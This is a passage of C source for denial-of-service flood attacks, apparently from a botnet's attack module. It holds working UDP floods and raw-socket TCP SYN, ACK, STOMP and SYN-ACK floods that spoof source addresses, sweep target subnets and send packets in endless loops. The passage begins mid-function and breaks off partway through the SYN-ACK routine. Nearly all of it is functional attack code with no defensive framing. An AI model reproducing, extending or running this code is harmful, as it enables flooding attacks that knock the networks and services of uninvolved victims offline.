            // UDP header checksum
            udp_header->check = 0;
            udp_header->check = tcp_udp_header_checksum(ip_header, udp_header, udp_header->len, sizeof (struct udphdr) + sizeof (uint32_t) + size);

            // Set the addr
            addr.sin_family = AF_INET;
            addr.sin_port = dport;
            addr.sin_addr.s_addr = ip_header->daddr;

            sendto(fds[x], data[x], sizeof(struct iphdr) + sizeof(struct udphdr) + size, MSG_NOSIGNAL, (struct sockaddr *)&addr, sizeof(addr));
        }
    }
}



void flood_udp_classic(struct arguments *args)
{
    DEBUG_PRINT("UDP!\n");

    uint16_t size = 0;
    uint16_t port = 0;
    int i = 0;
    char **data;
    int *fds;

    size = retrieve_opt_num(args->options, args->num_of_flags, OPT_SIZE, 1400); // Default size to 900 if not specified
    port = retrieve_opt_num(args->options, args->num_of_flags, OPT_PORT, 0xffff); // Default to 65535 if port not specified

    DEBUG_PRINT("Num of flags: %d\n", args->num_of_flags);
    DEBUG_PRINT("Num of targets: %d\n", args->num_of_targets);
    DEBUG_PRINT("Size: %d\n", size);
    DEBUG_PRINT("Port: %d\n", port);

    for(i = 0; i < args->num_of_targets; i++)
    {
        DEBUG_PRINT("Target: %d.%d.%d.%d/%d\n", args->targets[i].host & 0xff, (args->targets[i].host >> 8) & 0xff, (args->targets[i].host >> 16) & 0xff, (args->targets[i].host >> 24) & 0xff, args->targets[i].netmask);
    }

    data = (char **)calloc(args->num_of_targets, sizeof(char *));
    if(!data)
    {
        exit(1);
    }

    fds = (int *)calloc(args->num_of_targets, sizeof(int));
    if(!fds)
    {
        exit(1);
    }

    for(i = 0; i < args->num_of_targets; i++)
    {
        struct sockaddr_in bind_addr;
        struct sockaddr_in addr;

        fds[i] = socket(AF_INET, SOCK_DGRAM, 0);
        if(fds[i] == -1)
        {
            exit(1);
        }

        data[i] = (char *)malloc(size + 1);
        if(!data[i])
        {
            exit(1);
        }

        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = rand_new();
        bind_addr.sin_addr.s_addr = 0;

        bind(fds[i], (struct sockaddr *)&bind_addr, sizeof(bind_addr));

        addr.sin_family = AF_INET;
        addr.sin_port = htons(port);
        addr.sin_addr.s_addr = args->targets[i].netmask < 32 ? (htonl(ntohl(args->targets[i].host) + (((uint32_t)rand_new()) >> args->targets[i].netmask))) : args->targets[i].host;

        connect(fds[i], (struct sockaddr *)&addr, sizeof(addr));

        rand_string(data[i], size);
    }

    while(TRUE)
    {
        for(i = 0; i < args->num_of_targets; i++)
        {
            send(fds[i], data[i], size, MSG_NOSIGNAL);
        }
    }
}

void flood_udp_plain(struct arguments *args)
{
    DEBUG_PRINT("UDPPLAIN!\n");

    uint16_t size = 0;
    uint16_t port = 0;
    int i = 0;
    char **data;
    int *fds;

    size = retrieve_opt_num(args->options, args->num_of_flags, OPT_SIZE, 1); // Default size to 100 if not specified
    port = retrieve_opt_num(args->options, args->num_of_flags, OPT_PORT, 0xffff); // Default to 65535 if port not specified

    DEBUG_PRINT("Num of flags: %d\n", args->num_of_flags);
    DEBUG_PRINT("Num of targets: %d\n", args->num_of_targets);
    DEBUG_PRINT("Size: %d\n", size);
    DEBUG_PRINT("Port: %d\n", port);

    for(i = 0; i < args->num_of_targets; i++)
    {
        DEBUG_PRINT("Target: %d.%d.%d.%d/%d\n", args->targets[i].host & 0xff, (args->targets[i].host >> 8) & 0xff, (args->targets[i].host >> 16) & 0xff, (args->targets[i].host >> 24) & 0xff, args->targets[i].netmask);
    }

    data = (char **)calloc(args->num_of_targets, sizeof(char *));
    if(!data)
    {
        exit(1);
    }

    fds = (int *)calloc(args->num_of_targets, sizeof(int));
    if(!fds)
    {
        exit(1);
    }

    for(i = 0; i < args->num_of_targets; i++)
    {
        struct sockaddr_in bind_addr;
        struct sockaddr_in addr;

        fds[i] = socket(AF_INET, SOCK_DGRAM, 0);
        if(fds[i] == -1)
        {
            exit(1);
        }

        data[i] = (char *)malloc(size + 1);
        if(!data[i])
        {
            exit(1);
        }

        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = rand_new();
        bind_addr.sin_addr.s_addr = 0;

        bind(fds[i], (struct sockaddr *)&bind_addr, sizeof(bind_addr));

        addr.sin_family = AF_INET;
        addr.sin_port = htons(port);
        addr.sin_addr.s_addr = args->targets[i].netmask < 32 ? (htonl(ntohl(args->targets[i].host) + (((uint32_t)rand_new()) >> args->targets[i].netmask))) : args->targets[i].host;

        connect(fds[i], (struct sockaddr *)&addr, sizeof(addr));

        rand_string(data[i], size);
    }

    while(TRUE)
    {
        for(i = 0; i < args->num_of_targets; i++)
        {
            send(fds[i], data[i], size, MSG_NOSIGNAL);
        }
    }
}

void flood_tcp_syn(struct arguments *args)
{
    DEBUG_PRINT("SYNPLAIN!\n");

    int x = 0;
    int i = 0;
    uint16_t size = 0;
    uint16_t port = 0;
    uint8_t ttl = 0;
    uint16_t source_port = 0;
    char **data;
    char ack = FALSE;
    char fin = FALSE;
    char urg = FALSE;
    char psh = FALSE;
    char rst = FALSE;
    char syn = FALSE;
    uint8_t tos = 0;
    uint16_t id = 0;
    uint32_t sequence = 0;
    uint32_t source_ip = 0;
    uint32_t ack_sequence = 0;
    char *domain;
    int *fds;

    size = retrieve_opt_num(args->options, args->num_of_flags, OPT_SIZE, 1);
    port = retrieve_opt_num(args->options, args->num_of_flags, OPT_PORT, 0xffff);
    ttl = retrieve_opt_num(args->options, args->num_of_flags, OPT_TTL, 0xff);
    source_port = retrieve_opt_num(args->options, args->num_of_flags, OPT_SOURCE_PORT, 0xffff);
    ack = retrieve_opt_num(args->options, args->num_of_flags, OPT_ACK, FALSE);
    fin = retrieve_opt_num(args->options, args->num_of_flags, OPT_FIN, FALSE);
    urg = retrieve_opt_num(args->options, args->num_of_flags, OPT_URG, FALSE);
    psh = retrieve_opt_num(args->options, args->num_of_flags, OPT_PSH, FALSE);
    rst = retrieve_opt_num(args->options, args->num_of_flags, OPT_RST, FALSE);
    syn = retrieve_opt_num(args->options, args->num_of_flags, OPT_SYN, TRUE);
    tos = retrieve_opt_num(args->options, args->num_of_flags, OPT_TOS, 0);
    id = retrieve_opt_num(args->options, args->num_of_flags, OPT_ID, 0xffff);
    sequence = retrieve_opt_num(args->options, args->num_of_flags, OPT_SEQUENCE, 0xffff);
    source_ip = retrieve_opt_ipv4(args->options, args->num_of_flags, OPT_SOURCE_IP, LOCAL_ADDRESS);
    ack_sequence = retrieve_opt_num(args->options, args->num_of_flags, OPT_ACK_SEQUENCE, 0xffff);
    domain = retrieve_opt_str(args->options, args->num_of_flags, OPT_DOMAIN, NULL);

    data = (char **)calloc(args->num_of_targets, sizeof(char *));
    if(!data)
    {
        DEBUG_PRINT("Failed to allocate data to initialize the TCP ACK flood\n");
        exit(1);
    }

    fds = (int *)calloc(args->num_of_targets, sizeof(int));
    if(!fds)
    {
        exit(1);
    }

    for(x = 0; x < args->num_of_targets; x++)
    {
        struct iphdr *ip_header;
        struct tcphdr *tcp_header;
        char *a;

        fds[x] = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        if(fds[x] == -1)
        {
            DEBUG_PRINT("Failed to create the TCP socket for the flood!\n");
            free(data);
            exit(1);
        }

        i = 1;
        if(setsockopt(fds[x], IPPROTO_IP, IP_HDRINCL, &i, sizeof(i)) == -1)
        {
            DEBUG_PRINT("Failed to set IP_HDRINCL for the TCP flood\n");
            free(data);
            exit(1);
        }

        data[x] = (char *)malloc(size + 110);
        if(!data[x])
        {
            DEBUG_PRINT("Failed to allocate memory for the TCP flood\n");
            free(data);
            exit(1);
        }

        ip_header = (struct iphdr *)data[x];
        tcp_header = (struct tcphdr *)(ip_header + 1);
        a = (char *)(tcp_header + 1);

        // IPv4
        ip_header->version = 4;
        ip_header->tos = tos;
        ip_header->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + size);
        ip_header->ihl = 5;
        ip_header->frag_off = 0;
        ip_header->ttl = ttl;
        ip_header->id = htons(id);
        ip_header->protocol = IPPROTO_TCP;
        ip_header->saddr = source_ip;
        ip_header->daddr = args->targets[x].host;

        tcp_header->dest = htons(port);
        tcp_header->source = htons(source_port);
        tcp_header->seq = htons(sequence);
        tcp_header->doff = 5;
        // Set the flag respectively
        tcp_header->ack = ack;
        tcp_header->fin = fin;
        tcp_header->urg = urg;
        tcp_header->psh = psh;
        tcp_header->rst = rst;
        tcp_header->syn = syn;
        tcp_header->window = rand_new() & 0xffff;
        tcp_header->ack_seq = htons(ack_sequence);

        rand_string(a, size);
    }

    while(TRUE)
    {
        for(x = 0; x < args->num_of_targets; x++)
        {
            struct iphdr *ip_header;
            struct tcphdr *tcp_header;
            struct sockaddr_in addr;

            ip_header = (struct iphdr *)data[x];
            tcp_header = (struct tcphdr *)(ip_header + 1);

            if(args->targets[x].netmask < 32)
                ip_header->daddr = htonl(ntohl(ip_header->daddr) + (((uint32_t)rand_new()) >> args->targets[x].netmask));

            // Specified a random source address
            if(ip_header->saddr == 0xffffffff)
                ip_header->saddr = rand_new() & 0xffffffff;

            // Update the IP header
            if(ip_header->id == 0xffff)
                ip_header->id = rand_new() & 0xffff;

            // Update the TCP header
            if(tcp_header->dest == 0xffff)
                tcp_header->dest = rand_new() & 0xffff;

            if(tcp_header->source == 0xffff)
                tcp_header->source = rand_new() & 0xffff;

            if(tcp_header->seq == 0xffff)
                tcp_header->seq = rand_new() & 0xffff;

            if(tcp_header->ack_seq == 0xffff)
                tcp_header->ack_seq = rand_new() & 0xffff;

            // IP header checksum
            ip_header->check = 0;
            ip_header->check = ip_header_checksum((uint16_t *)ip_header, sizeof(struct iphdr));

            // TCP header checksum
            tcp_header->check = 0;
            tcp_header->check = tcp_udp_header_checksum(ip_header, tcp_header, htons(sizeof(struct tcphdr) + size), sizeof(struct tcphdr) + size);

            // Set the addr
            addr.sin_family = AF_INET;
            addr.sin_port = tcp_header->dest;
            addr.sin_addr.s_addr = ip_header->daddr;

            sendto(fds[x], data[x], sizeof(struct iphdr) + sizeof(struct tcphdr) + size, MSG_NOSIGNAL, (struct sockaddr *)&addr, sizeof(addr));
        }
    }
}
void flood_tcp_gack(struct arguments *args)
{
    DEBUG_PRINT("ACKFLOOD!\n");

    int x = 0;
    int i = 0;
    uint16_t size = 0;
    uint16_t port = 0;
    uint8_t ttl = 0;
    uint16_t source_port = 0;
    char **data;
    char ack = FALSE;
    char fin = FALSE;
    char urg = FALSE;
    char psh = FALSE;
    char rst = FALSE;
    char syn = FALSE;
    uint8_t tos = 0;
    uint16_t id = 0;
    uint32_t sequence = 0;
    uint32_t source_ip = 0;
    uint32_t ack_sequence = 0;
    char *domain;
    int *fds;

    size = retrieve_opt_num(args->options, args->num_of_flags, OPT_SIZE, 1400);
    port = retrieve_opt_num(args->options, args->num_of_flags, OPT_PORT, 0xffff);
    ttl = retrieve_opt_num(args->options, args->num_of_flags, OPT_TTL, 0xff);
    source_port = retrieve_opt_num(args->options, args->num_of_flags, OPT_SOURCE_PORT, 0xffff);
    ack = retrieve_opt_num(args->options, args->num_of_flags, OPT_ACK, TRUE);
    fin = retrieve_opt_num(args->options, args->num_of_flags, OPT_FIN, FALSE);
    urg = retrieve_opt_num(args->options, args->num_of_flags, OPT_URG, FALSE);
    psh = retrieve_opt_num(args->options, args->num_of_flags, OPT_PSH, FALSE);
    rst = retrieve_opt_num(args->options, args->num_of_flags, OPT_RST, FALSE);
    syn = retrieve_opt_num(args->options, args->num_of_flags, OPT_SYN, FALSE);
    tos = retrieve_opt_num(args->options, args->num_of_flags, OPT_TOS, 0);
    id = retrieve_opt_num(args->options, args->num_of_flags, OPT_ID, 0xffff);
    sequence = retrieve_opt_num(args->options, args->num_of_flags, OPT_SEQUENCE, 0xffff);
    source_ip = retrieve_opt_ipv4(args->options, args->num_of_flags, OPT_SOURCE_IP, LOCAL_ADDRESS);
    ack_sequence = retrieve_opt_num(args->options, args->num_of_flags, OPT_ACK_SEQUENCE, 0xffff);
    domain = retrieve_opt_str(args->options, args->num_of_flags, OPT_DOMAIN, NULL);

    data = (char **)calloc(args->num_of_targets, sizeof(char *));
    if(!data)
    {
        DEBUG_PRINT("Failed to allocate data to initialize the TCP ACK flood\n");
        exit(1);
    }

    fds = (int *)calloc(args->num_of_targets, sizeof(int));
    if(!fds)
    {
        exit(1);
    }

    for(x = 0; x < args->num_of_targets; x++)
    {
        struct iphdr *ip_header;
        struct tcphdr *tcp_header;
        char *a;

        fds[x] = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        if(fds[x] == -1)
        {
            DEBUG_PRINT("Failed to create the TCP socket for the flood!\n");
            free(data);
            exit(1);
        }

        i = 1;
        if(setsockopt(fds[x], IPPROTO_IP, IP_HDRINCL, &i, sizeof(i)) == -1)
        {
            DEBUG_PRINT("Failed to set IP_HDRINCL for the TCP flood\n");
            free(data);
            exit(1);
        }

        data[x] = (char *)malloc(size + 110);
        if(!data[x])
        {
            DEBUG_PRINT("Failed to allocate memory for the TCP flood\n");
            free(data);
            exit(1);
        }

        ip_header = (struct iphdr *)data[x];
        tcp_header = (struct tcphdr *)(ip_header + 1);
        a = (char *)(tcp_header + 1);

        // IPv4
        ip_header->version = 4;
        ip_header->tos = tos;
        ip_header->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + size);
        ip_header->ihl = 5;
        ip_header->frag_off = 0;
        ip_header->ttl = ttl;
        ip_header->id = htons(id);
        ip_header->protocol = IPPROTO_TCP;
        ip_header->saddr = source_ip;
        ip_header->daddr = args->targets[x].host;

        tcp_header->dest = htons(port);
        tcp_header->source = htons(source_port);
        tcp_header->seq = htons(sequence);
        tcp_header->doff = 5;
        // Set the flag respectively
        tcp_header->ack = ack;
        tcp_header->fin = fin;
        tcp_header->urg = urg;
        tcp_header->psh = psh;
        tcp_header->rst = rst;
        tcp_header->syn = syn;
        tcp_header->window = rand_new() & 0xffff;
        tcp_header->ack_seq = htons(ack_sequence);

        rand_string(a, size);
    }

    while(TRUE)
    {
        for(x = 0; x < args->num_of_targets; x++)
        {
            struct iphdr *ip_header;
            struct tcphdr *tcp_header;
            struct sockaddr_in addr;

            ip_header = (struct iphdr *)data[x];
            tcp_header = (struct tcphdr *)(ip_header + 1);

            if(args->targets[x].netmask < 32)
                ip_header->daddr = htonl(ntohl(ip_header->daddr) + (((uint32_t)rand_new()) >> args->targets[x].netmask));

            // Specified a random source address
            if(ip_header->saddr == 0xffffffff)
                ip_header->saddr = rand_new() & 0xffffffff;

            // Update the IP header
            if(ip_header->id == 0xffff)
                ip_header->id = rand_new() & 0xffff;

            // Update the TCP header
            if(tcp_header->dest == 0xffff)
                tcp_header->dest = rand_new() & 0xffff;

            if(tcp_header->source == 0xffff)
                tcp_header->source = rand_new() & 0xffff;

            if(tcp_header->seq == 0xffff)
                tcp_header->seq = rand_new() & 0xffff;

            if(tcp_header->ack_seq == 0xffff)
                tcp_header->ack_seq = rand_new() & 0xffff;

            // IP header checksum
            ip_header->check = 0;
            ip_header->check = ip_header_checksum((uint16_t *)ip_header, sizeof(struct iphdr));

            // TCP header checksum
            tcp_header->check = 0;
            tcp_header->check = tcp_udp_header_checksum(ip_header, tcp_header, htons(sizeof(struct tcphdr) + size), sizeof(struct tcphdr) + size);

            // Set the addr
            addr.sin_family = AF_INET;
            addr.sin_port = tcp_header->dest;
            addr.sin_addr.s_addr = ip_header->daddr;

            sendto(fds[x], data[x], sizeof(struct iphdr) + sizeof(struct tcphdr) + size, MSG_NOSIGNAL, (struct sockaddr *)&addr, sizeof(addr));
        }
    }
}

void flood_tcp_stomp(struct arguments *args) // ACK PSH FIN
{
    DEBUG_PRINT("TCP-STOMP Flood\n");
    int x = 0;
    int i = 0;
    char **data;
    int *fds;

    uint16_t size = retrieve_opt_num(args->options, args->num_of_flags, OPT_SIZE, 1400);
    uint16_t port = retrieve_opt_num(args->options, args->num_of_flags, OPT_PORT, 0xffff);
    uint8_t ttl = retrieve_opt_num(args->options, args->num_of_flags, OPT_TTL, 0xff);
    uint16_t source_port = retrieve_opt_num(args->options, args->num_of_flags, OPT_SOURCE_PORT, 0xffff);
    char ack = retrieve_opt_num(args->options, args->num_of_flags, OPT_ACK, TRUE);
    char fin = retrieve_opt_num(args->options, args->num_of_flags, OPT_FIN, TRUE);
    char urg = retrieve_opt_num(args->options, args->num_of_flags, OPT_URG, FALSE);
    char psh = retrieve_opt_num(args->options, args->num_of_flags, OPT_PSH, TRUE);
    char rst = retrieve_opt_num(args->options, args->num_of_flags, OPT_RST, FALSE);
    char syn = retrieve_opt_num(args->options, args->num_of_flags, OPT_SYN, FALSE);
    uint8_t tos = retrieve_opt_num(args->options, args->num_of_flags, OPT_TOS, 0);
    uint16_t id = retrieve_opt_num(args->options, args->num_of_flags, OPT_ID, 0xffff);
    uint32_t sequence = retrieve_opt_num(args->options, args->num_of_flags, OPT_SEQUENCE, 0xffff);
    uint32_t source_ip = retrieve_opt_ipv4(args->options, args->num_of_flags, OPT_SOURCE_IP, LOCAL_ADDRESS);
    uint32_t ack_sequence = retrieve_opt_num(args->options, args->num_of_flags, OPT_ACK_SEQUENCE, 0xffff);

    data = (char **)calloc(args->num_of_targets, sizeof(char *));
    if(!data)
    {
        exit(1);
    }

    fds = (int *)calloc(args->num_of_targets, sizeof(int));
    if(!fds)
    {
        exit(1);
    }

    for(x = 0; x < args->num_of_targets; x++)
    {
        struct iphdr *ip_header;
        struct tcphdr *tcp_header;
        char *a;

        fds[x] = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        if(fds[x] == -1)
        {
            free(data);
            exit(1);
        }

        i = 1;
        if(setsockopt(fds[x], IPPROTO_IP, IP_HDRINCL, &i, sizeof(i)) == -1)
        {
            free(data);
            exit(1);
        }

        data[x] = (char *)malloc(size + 110);
        if(!data[x])
        {
            free(data);
            exit(1);
        }

        ip_header = (struct iphdr *)data[x];
        tcp_header = (struct tcphdr *)(ip_header + 1);
        a = (char *)(tcp_header + 1);

        // IPv4
        ip_header->version = 4;
        ip_header->tos = tos;
        ip_header->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + size);
        ip_header->ihl = 5;
        ip_header->frag_off = 0;
        ip_header->ttl = ttl;
        ip_header->id = htons(id);
        ip_header->protocol = IPPROTO_TCP;
        ip_header->saddr = source_ip;
        ip_header->daddr = args->targets[x].host;

        tcp_header->dest = htons(port);
        tcp_header->source = htons(source_port);
        tcp_header->seq = htons(sequence);
        tcp_header->doff = 5;
        // Set the flag respectively
        tcp_header->ack = ack;
        tcp_header->fin = fin;
        tcp_header->urg = urg;
        tcp_header->psh = psh;
        tcp_header->rst = rst;
        tcp_header->syn = syn;
        tcp_header->window = rand_new() & 0xffff;
        tcp_header->ack_seq = htons(ack_sequence);

        rand_string(a, size);
    }

    while(TRUE)
    {
        for(x = 0; x < args->num_of_targets; x++)
        {
            struct iphdr *ip_header;
            struct tcphdr *tcp_header;
            struct sockaddr_in addr;

            ip_header = (struct iphdr *)data[x];
            tcp_header = (struct tcphdr *)(ip_header + 1);

            if(args->targets[x].netmask < 32)
                ip_header->daddr = htonl(ntohl(ip_header->daddr) + (((uint32_t)rand_new()) >> args->targets[x].netmask));

            // Specified a random source address
            if(ip_header->saddr == 0xffffffff)
                ip_header->saddr = rand_new() & 0xffffffff;

            // Update the IP header
            if(ip_header->id == 0xffff)
                ip_header->id = rand_new() & 0xffff;

            // Update the TCP header
            if(tcp_header->dest == 0xffff)
                tcp_header->dest = rand_new() & 0xffff;

            if(tcp_header->source == 0xffff)
                tcp_header->source = rand_new() & 0xffff;

            if(tcp_header->seq == 0xffff)
                tcp_header->seq = rand_new() & 0xffff;

            if(tcp_header->ack_seq == 0xffff)
                tcp_header->ack_seq = rand_new() & 0xffff;

            // IP header checksum
            ip_header->check = 0;
            ip_header->check = ip_header_checksum((uint16_t *)ip_header, sizeof(struct iphdr));

            // TCP header checksum
            tcp_header->check = 0;
            tcp_header->check = tcp_udp_header_checksum(ip_header, tcp_header, htons(sizeof(struct tcphdr) + size), sizeof(struct tcphdr) + size);

            // Set the addr
            addr.sin_family = AF_INET;
            addr.sin_port = tcp_header->dest;
            addr.sin_addr.s_addr = ip_header->daddr;

            sendto(fds[x], data[x], sizeof(struct iphdr) + sizeof(struct tcphdr) + size, MSG_NOSIGNAL, (struct sockaddr *)&addr, sizeof(addr));
        }
    }
}

void flood_tcp_gsyn(struct arguments *args)
{
    DEBUG_PRINT("SYNFLOOD!\n");

    int x = 0;
    int i = 0;
    uint16_t size = 0;
    uint16_t port = 0;
    uint8_t ttl = 0;
    uint16_t source_port = 0;
    char **data;
    char ack = FALSE;
    char fin = FALSE;
    char urg = FALSE;
    char psh = FALSE;
    char rst = FALSE;
    char syn = FALSE;
    uint8_t tos = 0;
    uint16_t id = 0;
    uint32_t sequence = 0;
    uint32_t source_ip = 0;
    uint32_t ack_sequence = 0;
    char *domain;
    int *fds;

    size = retrieve_opt_num(args->options, args->num_of_flags, OPT_SIZE, 1400);
    port = retrieve_opt_num(args->options, args->num_of_flags, OPT_PORT, 0xffff);
    ttl = retrieve_opt_num(args->options, args->num_of_flags, OPT_TTL, 0xff);
    source_port = retrieve_opt_num(args->options, args->num_of_flags, OPT_SOURCE_PORT, 0xffff);
    ack = retrieve_opt_num(args->options, args->num_of_flags, OPT_ACK, FALSE);
    fin = retrieve_opt_num(args->options, args->num_of_flags, OPT_FIN, FALSE);
    urg = retrieve_opt_num(args->options, args->num_of_flags, OPT_URG, FALSE);
    psh = retrieve_opt_num(args->options, args->num_of_flags, OPT_PSH, FALSE);
    rst = retrieve_opt_num(args->options, args->num_of_flags, OPT_RST, FALSE);
    syn = retrieve_opt_num(args->options, args->num_of_flags, OPT_SYN, TRUE);
    tos = retrieve_opt_num(args->options, args->num_of_flags, OPT_TOS, 0);
    id = retrieve_opt_num(args->options, args->num_of_flags, OPT_ID, 0xffff);
    sequence = retrieve_opt_num(args->options, args->num_of_flags, OPT_SEQUENCE, 0xffff);
    source_ip = retrieve_opt_ipv4(args->options, args->num_of_flags, OPT_SOURCE_IP, LOCAL_ADDRESS);
    ack_sequence = retrieve_opt_num(args->options, args->num_of_flags, OPT_ACK_SEQUENCE, 0xffff);
    domain = retrieve_opt_str(args->options, args->num_of_flags, OPT_DOMAIN, NULL);

    data = (char **)calloc(args->num_of_targets, sizeof(char *));
    if(!data)
    {
        DEBUG_PRINT("Failed to allocate data to initialize the TCP ACK flood\n");
        exit(1);
    }

    fds = (int *)calloc(args->num_of_targets, sizeof(int));
    if(!fds)
    {
        exit(1);
    }

    for(x = 0; x < args->num_of_targets; x++)
    {
        struct iphdr *ip_header;
        struct tcphdr *tcp_header;
        char *a;

        fds[x] = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        if(fds[x] == -1)
        {
            DEBUG_PRINT("Failed to create the TCP socket for the flood!\n");
            free(data);
            exit(1);
        }

        i = 1;
        if(setsockopt(fds[x], IPPROTO_IP, IP_HDRINCL, &i, sizeof(i)) == -1)
        {
            DEBUG_PRINT("Failed to set IP_HDRINCL for the TCP flood\n");
            free(data);
            exit(1);
        }

        data[x] = (char *)malloc(size + 110);
        if(!data[x])
        {
            DEBUG_PRINT("Failed to allocate memory for the TCP flood\n");
            free(data);
            exit(1);
        }

        ip_header = (struct iphdr *)data[x];
        tcp_header = (struct tcphdr *)(ip_header + 1);
        a = (char *)(tcp_header + 1);

        // IPv4
        ip_header->version = 4;
        ip_header->tos = tos;
        ip_header->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + size);
        ip_header->ihl = 5;
        ip_header->frag_off = 0;
        ip_header->ttl = ttl;
        ip_header->id = htons(id);
        ip_header->protocol = IPPROTO_TCP;
        ip_header->saddr = source_ip;
        ip_header->daddr = args->targets[x].host;

        tcp_header->dest = htons(port);
        tcp_header->source = htons(source_port);
        tcp_header->seq = htons(sequence);
        tcp_header->doff = 5;
        // Set the flag respectively
        tcp_header->ack = ack;
        tcp_header->fin = fin;
        tcp_header->urg = urg;
        tcp_header->psh = psh;
        tcp_header->rst = rst;
        tcp_header->syn = syn;
        tcp_header->window = rand_new() & 0xffff;
        tcp_header->ack_seq = htons(ack_sequence);

        rand_string(a, size);
    }

    while(TRUE)
    {
        for(x = 0; x < args->num_of_targets; x++)
        {
            struct iphdr *ip_header;
            struct tcphdr *tcp_header;
            struct sockaddr_in addr;

            ip_header = (struct iphdr *)data[x];
            tcp_header = (struct tcphdr *)(ip_header + 1);

            if(args->targets[x].netmask < 32)
                ip_header->daddr = htonl(ntohl(ip_header->daddr) + (((uint32_t)rand_new()) >> args->targets[x].netmask));

            // Specified a random source address
            if(ip_header->saddr == 0xffffffff)
                ip_header->saddr = rand_new() & 0xffffffff;

            // Update the IP header
            if(ip_header->id == 0xffff)
                ip_header->id = rand_new() & 0xffff;

            // Update the TCP header
            if(tcp_header->dest == 0xffff)
                tcp_header->dest = rand_new() & 0xffff;

            if(tcp_header->source == 0xffff)
                tcp_header->source = rand_new() & 0xffff;

            if(tcp_header->seq == 0xffff)
                tcp_header->seq = rand_new() & 0xffff;

            if(tcp_header->ack_seq == 0xffff)
                tcp_header->ack_seq = rand_new() & 0xffff;

            // IP header checksum
            ip_header->check = 0;
            ip_header->check = ip_header_checksum((uint16_t *)ip_header, sizeof(struct iphdr));

            // TCP header checksum
            tcp_header->check = 0;
            tcp_header->check = tcp_udp_header_checksum(ip_header, tcp_header, htons(sizeof(struct tcphdr) + size), sizeof(struct tcphdr) + size);

            // Set the addr
            addr.sin_family = AF_INET;
            addr.sin_port = tcp_header->dest;
            addr.sin_addr.s_addr = ip_header->daddr;

            sendto(fds[x], data[x], sizeof(struct iphdr) + sizeof(struct tcphdr) + size, MSG_NOSIGNAL, (struct sockaddr *)&addr, sizeof(addr));
        }
    }
}

void flood_tcp_sack(struct arguments *args)
{
    DEBUG_PRINT("SYN-ACK!\n");

    int x = 0;
    int i = 0;
    uint16_t size = 0;
    uint16_t port = 0;
    uint8_t ttl = 0;
    uint16_t source_port = 0;
    char **data;
    char ack = FALSE;
    char fin = FALSE;
    char urg = FALSE;
    char psh = FALSE;
    char rst = FALSE;
    char syn = FALSE;
    uint8_t tos = 0;
    uint16_t id = 0;
    uint32_t sequence = 0;
    uint32_t source_ip = 0;
    uint32_t ack_sequence = 0;
    char *domain;
    int *fds;

    size = retrieve_opt_num(args->options, args->num_of_flags, OPT_SIZE, 1);
    port = retrieve_opt_num(args->options, args->num_of_flags, OPT_PORT, 0xffff);
    ttl = retrieve_opt_num(args->options, args->num_of_flags, OPT_TTL, 0xff);
    source_port = retrieve_opt_num(args->options, args->num_of_flags, OPT_SOURCE_PORT, 0xffff);
    ack = retrieve_opt_num(args->options, args->num_of_flags, OPT_ACK, TRUE);
    fin = retrieve_opt_num(args->options, args->num_of_flags, OPT_FIN, FALSE);
    urg = retrieve_opt_num(args->options, args->num_of_flags, OPT_URG, FALSE);
    psh = retrieve_opt_num(args->options, args->num_of_flags, OPT_PSH, FALSE);
    rst = retrieve_opt_num(args->options, args->num_of_flags, OPT_RST, FALSE);
    syn = retrieve_opt_num(args->options, args->num_of_flags, OPT_SYN, TRUE);
    tos = retrieve_opt_num(args->options, args->num_of_flags, OPT_TOS, 0);
    id = retrieve_opt_num(args->options, args->num_of_flags, OPT_ID, 0xffff);
    sequence = retrieve_opt_num(args->options, args->num_of_flags, OPT_SEQUENCE, 0xffff);
    source_ip = retrieve_opt_ipv4(args->options, args->num_of_flags, OPT_SOURCE_IP, LOCAL_ADDRESS);
    ack_sequence = retrieve_opt_num(args->options, args->num_of_flags, OPT_ACK_SEQUENCE, 0xffff);
    domain = retrieve_opt_str(args->options, args->num_of_flags, OPT_DOMAIN, NULL);

    data = (char **)calloc(args->num_of_targets, sizeof(char *));
    if(!data)
    {
        DEBUG_PRINT("Failed to allocate data to initialize the TCP ACK flood\n");
        exit(1);
    }

    fds = (int *)calloc(args->num_of_targets, sizeof(int));
    if(!fds)
    {
        exit(1);
    }

    for(x = 0; x < args->num_of_targets; x++)
    {
        struct iphdr *ip_header;
        struct tcphdr *tcp_header;
        char *a;

        fds[x] = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        if(fds[x] == -1)
        {
            DEBUG_PRINT("Failed to create the TCP socket for the flood!\n");
            free(data);
            exit(1);
        }

        i = 1;
        if(setsockopt(fds[x], IPPROTO_IP, IP_HDRINCL, &i, sizeof(i)) == -1)
        {
            DEBUG_PRINT("Failed to set IP_HDRINCL for the TCP flood\n");
            free(data);
            exit(1);
        }

        data[x] = (char *)malloc(size + 110);
        if(!data[x])
        {
            DEBUG_PRINT("Failed to allocate memory for the TCP flood\n");
            free(data);
            exit(1);
        }

        ip_header = (struct iphdr *)data[x];
        tcp_header = (struct tcphdr *)(ip_header + 1);
        a = (char *)(tcp_header + 1);

        // IPv4
        ip_header->version = 4;
        ip_header->tos = tos;
        ip_header->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + size);
        ip_header->ihl = 5;
        ip_header->frag_off = 0;
        ip_header->ttl = ttl;
        ip_header->id = htons(id);
        ip_header->protocol = IPPROTO_TCP;
        ip_header->saddr = source_ip;
        ip_header->daddr = args->targets[x].host;

        tcp_header->dest = htons(port);
        tcp_header->source = htons(source_port);
        tcp_header->seq = htons(sequence);
        tcp_header->doff = 5;
        // Set the flag respectively
        tcp_header->ack = ack;
        tcp_header->fin = fin;
        tcp_header->urg = urg;
        tcp_header->psh = psh;
        tcp_header->rst = rst;
        tcp_header->syn = syn;
        tcp_header->window = rand_new() & 0xffff;
        tcp_header->ack_seq = htons(ack_sequence);

        rand_string(a, size);
    }

    while(TRUE)
    {
        for(x = 0; x < args->num_of_targets; x++)
        {
            struct iphdr *ip_header;
            struct tcphdr *tcp_header;
            struct sockaddr_in addr;

